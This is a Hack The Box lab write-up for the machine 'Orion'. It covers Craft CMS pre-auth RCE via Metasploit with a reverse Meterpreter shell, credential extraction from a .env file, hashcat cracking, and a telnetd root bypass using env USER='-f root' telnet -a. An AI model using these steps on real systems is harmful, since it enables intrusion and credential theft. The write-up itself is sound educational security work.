---
title: 'Orion'
target: 'Hack The Box — Orion'
difficulty: 'easy'
date: 2025-08-29
summary: 'An HTB machine — enumerating a web application behind nginx that redirects to orion.htb, discovering /admin/login running Craft CMS 5.6.16, exploiting CVE-2025-32432 (Craft CMS Image Transform Preauth RCE) via Metasploit for a shell as www-data, extracting MySQL credentials from the Craft .env file, cracking a bcrypt hash from the users table with hashcat to get SSH access as adam, then escalating to root by exploiting CVE-2026-24061 in telnetd (GNU inetutils 2.7) running locally on port 23.'
role: 'pentest'
tags: ['nmap', 'gobuster', 'craft-cms', 'cve-2025-32432', 'metasploit', 'meterpreter', 'mysql', 'hashcat', 'bcrypt', 'password-reuse', 'ssh', 'telnet', 'cve-2026-24061', 'privilege-escalation']
problem: 'Orion is an easy-rated Linux machine running SSH (22) and nginx (80) that redirects to orion.htb. The web application is powered by Craft CMS 5.6.16, which has an admin login portal at /admin/login. The machine runs a vulnerable version of Craft CMS susceptible to pre-authentication RCE, a MySQL database with reused credentials, and a locally-bound telnetd service vulnerable to authentication bypass.'
action: 'Ran nmap to identify open ports — 22/tcp (OpenSSH 8.9p1) and 80/tcp (nginx 1.18.0) redirecting to http://orion.htb. Added the hostname to /etc/hosts. Ran gobuster to discover /admin (redirecting to /admin/login) and /assets. The admin login page identified the application as Craft CMS 5.6.16. Searched Metasploit for craftcms exploits and found exploit/linux/http/craftcms_preauth_rce_cve_2025_32432 targeting CVE-2025-32432 — a pre-authentication RCE via image transform processing. Configured lhost (10.10.15.111) and rhosts (10.129.244.146), ran the exploit which leaked the session save path at /var/lib/php/sessions, confirmed the target as vulnerable, injected a stub, and opened a Meterpreter session. Dropped into a shell and enumerated the Craft CMS directory at ~/html/craft, finding the .env file with database credentials — CRAFT_DB_USER=root, CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!, CRAFT_DB_DATABASE=orion. Connected to MariaDB, listed databases, selected the orion database, and queried the users table to extract a bcrypt hash for user adam. Cracked the hash with hashcat (mode 3200, rockyou.txt wordlist) — the password was darkangel. Used the cracked password to SSH in as adam. Enumerated listening ports with ss -lntp and found port 23 (telnet) bound to 127.0.0.1. Checked the telnet version — GNU inetutils 2.7, vulnerable to CVE-2026-24061. Exploited the authentication bypass with env USER="-f root" telnet -a 127.0.0.1 23 to obtain a root shell.'
outcome: 'Gained root access to the machine. The attack chain was Craft CMS pre-authentication RCE (CVE-2025-32432) for initial shell as www-data, database credential extraction and password cracking for lateral movement to user adam via SSH, and telnetd authentication bypass (CVE-2026-24061) for privilege escalation to root.'
draft: false
---

## Background

Orion is an easy-rated Linux machine hosting Orion Telecom's internal web application behind Craft CMS. The attack chain is clean and methodical — a known CVE in Craft CMS provides the initial foothold without needing credentials, database credentials left in the environment file lead to a crackable password hash, and a locally-bound telnet service with an authentication bypass vulnerability delivers root. Each step builds on the access from the previous one, and the box demonstrates how a single exposed credential file can unravel an entire system when passwords are reused.

---

## Enumeration

An nmap scan against the target reveals two open ports.

![Nmap scan results showing port 22/tcp open SSH OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 and port 80/tcp open HTTP nginx 1.18.0 Ubuntu with supported methods GET HEAD POST OPTIONS, http-server-header nginx/1.18.0, and http-title indicating a redirect to http://orion.htb/.](/writeups/htb-orion/01-nmap.png)

Port 22 running OpenSSH 8.9p1 and port 80 running nginx 1.18.0. The nmap output shows the HTTP title as "Did not follow redirect to http://orion.htb/" — the web server is redirecting to a hostname, so adding `orion.htb` to `/etc/hosts` is necessary before the application will load.

After adding the hostname and browsing the application, there isn't much to work with on the main site. Running gobuster to enumerate hidden directories reveals two interesting endpoints.

```bash
gobuster dir \
  -u http://orion.htb \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt \
  -x php,txt,html,bak,zip \
  -t 50
```

![Gobuster results showing /admin with status 302 redirecting to http://orion.htb/admin/login and /assets with status 301 redirecting to http://orion.htb/assets/.](/writeups/htb-orion/02-gobuster.png)

The `/admin` endpoint redirects to `/admin/login` — an admin panel. Browsing to it reveals the identity of the application.

![Craft CMS login page titled Orion Telecom Administration with subtitle Internal Website Management Portal, showing Username or Email and Password fields, a Forgot password link, Stay signed in for 2 weeks checkbox, a Sign in button, and the Craft CMS 5.6.16 version at the bottom.](/writeups/htb-orion/03-craftcms-login.png)

The login page identifies the application as **Craft CMS 5.6.16** — the version number is displayed at the bottom of the page. Craft CMS is a flexible content management system built on PHP, and version 5.6.16 is known to be vulnerable to a critical pre-authentication remote code execution vulnerability.

---

## CVE-2025-32432 — Craft CMS pre-authentication RCE

CVE-2025-32432 is a pre-authentication RCE in Craft CMS that targets the image transform processing functionality. An attacker can send crafted HTTP requests to asset transform endpoints, inject a custom PHP object, upload malicious PHP code, and execute arbitrary commands on the server — all without needing valid credentials.

Searching Metasploit for Craft CMS exploits returns several modules, including one specifically targeting this CVE.

![Metasploit search results for craftcms showing four matching modules — craftcms_preauth_rce_cve_2025_32432 (2025-04-14, excellent rank, Craft CMS Image Transform Preauth RCE), craftcms_ftp_template (2024-12-19, Craft CMS Twig Template Injection RCE via FTP Templates Path), and craftcms_unauth_rce_cve_2023_41892 (2023-09-13, Craft CMS unauthenticated Remote Code Execution).](/writeups/htb-orion/04-msf-search.png)

The `craftcms_preauth_rce_cve_2025_32432` module is the one to use — it has an excellent rank and two payload targets (PHP In-Memory and Unix/Linux Command Shell). Selecting the exploit and configuring lhost and rhosts:

![Metasploit console showing the exploit module selected with set lhost 10.10.15.111 and set rhosts 10.129.244.146 configured.](/writeups/htb-orion/05-msf-config.png)

Running the exploit triggers the full attack chain — it leaks the session save path at `/var/lib/php/sessions`, confirms the target is vulnerable, injects a stub, sends the stage, and opens a Meterpreter session.

![Metasploit exploit execution showing Started reverse TCP handler on 10.10.15.111:4444, Running automatic check, Leaked session.save_path /var/lib/php/sessions, The target is vulnerable Session path leaked, Injecting stub and triggering payload, Sending stage 40004 bytes, Meterpreter session 1 opened at 2026-07-12, then dropping into a shell with Process 1731 created Channel 0 created and ls showing assets cpresources index.html index.php in the web root.](/writeups/htb-orion/06-msf-shell.png)

The Meterpreter session opens and dropping into a system shell with the `shell` command lands in the web root as `www-data`. The directory listing shows the standard Craft CMS web root — `assets`, `cpresources`, `index.html`, and `index.php`.

---

## Database credentials and password cracking

With a shell as www-data, the next step is enumerating the Craft CMS installation. The application lives at `~/html/craft`, and listing the directory reveals the full Craft CMS structure including the `.env` file.

![Terminal showing ls -la of ~/html/craft as www-data with the full directory listing — .env (718 bytes), .env.example.dev, .env.example.production, .env.example.staging, .gitignore, bootstrap.php, composer.json, composer.lock (310507 bytes), config, craft, storage, templates, vendor, and web directories — all owned by www-data.](/writeups/htb-orion/07-craft-directory.png)

The `.env` file contains the application's configuration including the database credentials.

![Contents of the .env file showing General settings — CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8, CRAFT_DEV_MODE=true, CRAFT_ALLOW_ADMIN_CHANGES=true, CRAFT_DISALLOW_ROBOTS=true, CRAFT_DB_DRIVER=mysql, CRAFT_DB_SERVER=127.0.0.1, CRAFT_DB_PORT=3306, CRAFT_DB_DATABASE=orion, CRAFT_DB_USER=root, CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!, and PRIMARY_SITE_URL=http://orion.htb/.](/writeups/htb-orion/08-env-file.png)

The database credentials are `root:SuperSecureCraft123Pass!` connecting to the `orion` database on localhost. With `CRAFT_DEV_MODE=true` and `CRAFT_ALLOW_ADMIN_CHANGES=true`, this is clearly a development or staging deployment that was left exposed.

Connecting to MariaDB with these credentials and enumerating the databases:

```bash
mysql -u root -p orion
```

![MariaDB console showing show databases returning five databases — information_schema, mysql, orion, performance_schema, sys — then use orion and show tables.](/writeups/htb-orion/09-mariadb.png)

The `orion` database contains Craft CMS's tables, including a `users` table. Querying it reveals a bcrypt hash for user **adam** who has admin privileges. Saving the hash and cracking it with hashcat using the rockyou wordlist:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

![Hashcat output showing Pure Kernel feature, rockyou.txt wordlist, 1/1 queue and digests recovered at 100%, candidate gloria mapped to darkangel, started Sun Jul 12 02:27:10 2026 and stopped Sun Jul 12 02:31:44 2026.](/writeups/htb-orion/10-hashcat.png)

The bcrypt hash cracks to **darkangel**. Testing this password for SSH access as adam:

```bash
ssh adam@10.129.244.146
```

The password works — adam reused his Craft CMS password for SSH. The user flag was retrieved from adam's home directory.

---

## Privilege escalation — CVE-2026-24061

With SSH access as adam, enumerating the system for privilege escalation vectors. Checking listening ports with `ss -lntp` reveals an interesting service.

![Terminal showing ss -lntp output as adam with six listening ports — 127.0.0.1:23 (telnet), 0.0.0.0:80 (nginx), 0.0.0.0:22 (SSH), 127.0.0.53%lo:53 (DNS), 127.0.0.1:3306 (MySQL), and [::]:22 (SSH IPv6).](/writeups/htb-orion/11-ss-lntp.png)

Port 23 is bound to `127.0.0.1` — a telnet service running locally. Checking the version:

![Terminal showing telnet --version output — telnet GNU inetutils 2.7, Copyright 2025 Free Software Foundation Inc, GPLv3+ license.](/writeups/htb-orion/12-telnet-version.png)

GNU inetutils **2.7** — this version is vulnerable to **CVE-2026-24061**, an authentication bypass vulnerability in the telnet client. The vulnerability exists in how the client processes the `USER` environment variable when automatic login (`-a`) is enabled. The client reads `USER` to determine the username for authentication, but if `USER` contains option-like strings (such as `-f root`), the client interprets them as command-line flags rather than a username value. The `-f` option instructs the client to forward authentication for the specified user, allowing an attacker to authenticate as any user — including root.

```bash
env USER='-f root' telnet -a 127.0.0.1 23
```

The breakdown: `env USER='-f root'` sets the `USER` environment variable to `-f root` instead of the current username. When `telnet -a` reads this value for automatic login, it interprets `-f` as the forward-authentication flag and `root` as the target user, effectively authenticating as root without a password.

![Root shell on orion showing ls output with root.txt and snap in root's home directory.](/writeups/htb-orion/13-root-flag.png)

Root shell obtained. The root flag was retrieved.

---

## What I took from this

The Craft CMS vulnerability (CVE-2025-32432) is a reminder of how dangerous pre-authentication RCE is in content management systems. The admin panel was protected by a login form, but the vulnerability bypassed authentication entirely by targeting the image transform processing pipeline — a feature that by design needs to handle unauthenticated requests for asset delivery. The Metasploit module made exploitation trivial, but the underlying vulnerability — PHP object injection through crafted image transform parameters — is the kind of bug that application security teams need to catch during code review of any feature that processes user-controlled input into serialized objects.

The `.env` file exposure is a common pattern in PHP framework deployments. Craft CMS, like Laravel and other frameworks, stores sensitive configuration in `.env` files that should never be accessible from the web and should have restrictive file permissions. In this case, the database password was strong enough to resist brute forcing, but the `.env` file handed it over directly. The real damage came from password reuse — adam used the same password for his CMS account and his SSH login, turning a database credential into full user access.

The telnetd privilege escalation through CVE-2026-24061 is an elegant environment variable injection. The telnet client trusts the `USER` environment variable as a plain string and passes it through argument parsing, where the `-f` flag has a privileged meaning — forward authentication for a specified user. The fix is straightforward (sanitise the environment variable before parsing), but the vulnerability highlights how environment variables can be a subtle attack vector when programs treat them as trusted input. The fact that telnet was running only on localhost meant it required local access first, but once you had a shell as any user, it was a direct path to root.
